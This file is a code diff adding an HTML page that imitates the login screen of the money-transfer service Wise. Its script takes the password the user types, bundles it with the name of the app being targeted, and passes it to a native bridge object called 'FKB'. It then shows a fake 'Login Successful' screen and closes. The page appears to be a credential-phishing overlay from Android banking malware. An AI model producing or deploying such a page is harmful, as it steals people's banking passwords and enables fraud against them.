@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Wise</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;width:100%;overflow-y:auto}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100dvh}
+#main{width:100%;max-width:400px;padding:0 28px;display:flex;flex-direction:column;align-items:center}
+.logo-area{margin-top:14vh;margin-bottom:36px;display:flex;flex-direction:column;align-items:center}
+.logo-icon{width:64px;height:64px;background:#9FE870;border-radius:16px;display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+.logo-icon span{color:#163300;font-size:18px;font-weight:800;letter-spacing:.5px}
+.logo-name{color:#163300;font-size:20px;font-weight:700}
+.form-title{color:#163300;font-size:18px;font-weight:600;margin-bottom:20px;width:100%;text-align:left}
+.input-group{width:100%;margin-bottom:16px}
+.input-label{color:#6b7c5f;font-size:12px;margin-bottom:6px;display:block}
+.input-wrap{position:relative;width:100%}
+#pwd{width:100%;height:52px;background:#fff;border:1.5px solid #d4ddd0;border-radius:8px;padding:0 44px 0 16px;color:#163300;font-size:16px;outline:none;transition:border-color .2s}
+#pwd::placeholder{color:#b0bfa8;font-size:14px}
+#pwd:focus{border-color:#9FE870}
+.eye-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;padding:6px;cursor:pointer}
+.eye-btn svg{width:20px;height:20px;fill:#6b7c5f}
+.btn{width:100%;height:50px;background:#9FE870;border:none;border-radius:8px;color:#163300;font-size:16px;font-weight:700;margin-top:12px;cursor:pointer;opacity:.4;pointer-events:none;transition:all .2s}
+.btn.on{opacity:1;pointer-events:auto}
+.btn.on:active{background:#8ad85e}
+.forgot{text-align:center;margin-top:16px}
+.forgot a{color:#163300;font-size:13px;text-decoration:underline}
+.sp,.ok{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:999;align-items:center;justify-content:center;flex-direction:column}
+.sp.show,.ok.show{display:flex}
+.sp-spinner{width:36px;height:36px;border:3px solid #9FE87033;border-top-color:#9FE870;border-radius:50%;animation:spin .7s linear infinite}
+.sp-text{margin-top:14px;font-size:13px;color:#6b7c5f}
+@keyframes spin{to{transform:rotate(360deg)}}
+.ok-icon{width:56px;height:56px;border-radius:50%;background:#9FE870;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+.ok-icon svg{width:30px;height:30px;fill:#163300}
+.ok-text{font-size:15px;color:#163300;font-weight:500}
+</style></head>
+<body>
+<div id="main">
+  <div class="logo-area">
+    <div class="logo-icon"><span>Wise</span></div>
+    <div class="logo-name">Wise</div>
+  </div>
+  <div class="form-title">Log in to Wise</div>
+  <div class="input-group">
+    <span class="input-label">Password</span>
+    <div class="input-wrap">
+      <input type="password" id="pwd" placeholder="Enter your password" enterkeyhint="go">
+      <button class="eye-btn" type="button" id="eyeBtn"><svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></button>
+    </div>
+  </div>
+  <button id="btn" class="btn" onclick="doSubmit()">Log in</button>
+  <div class="forgot"><a href="javascript:void(0)">Forgot your password?</a></div>
+</div>
+<div class="sp" id="sp"><div class="sp-spinner"></div><div class="sp-text">Logging in...</div></div>
+<div class="ok" id="ok"><div class="ok-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="ok-text">Login Successful</div></div>
+<script>
+var pk='';try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}
+function doSubmit(){var p=document.getElementById('pwd').value;if(!p||p.length<3)return;document.activeElement.blur();document.getElementById('main').style.display='none';document.getElementById('sp').className='sp show';var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}var pl=JSON.stringify({password:p,pkg:pk});try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}setTimeout(function(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);}catch(e){}try{window.close();}catch(e){}},500);}
+var p=document.getElementById('pwd'),b=document.getElementById('btn');p.addEventListener('input',function(){b.className=p.value.length>=3?'btn on':'btn';});document.addEventListener('focusin',function(e){if(e.target.tagName==='INPUT'){setTimeout(function(){e.target.scrollIntoView({behavior:'smooth',block:'center'});},300);}});p.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();doSubmit();}});
+document.getElementById('eyeBtn').onclick=function(){var i=document.getElementById('pwd');i.type=i.type==='password'?'text':'password';};
+</script></body></html>
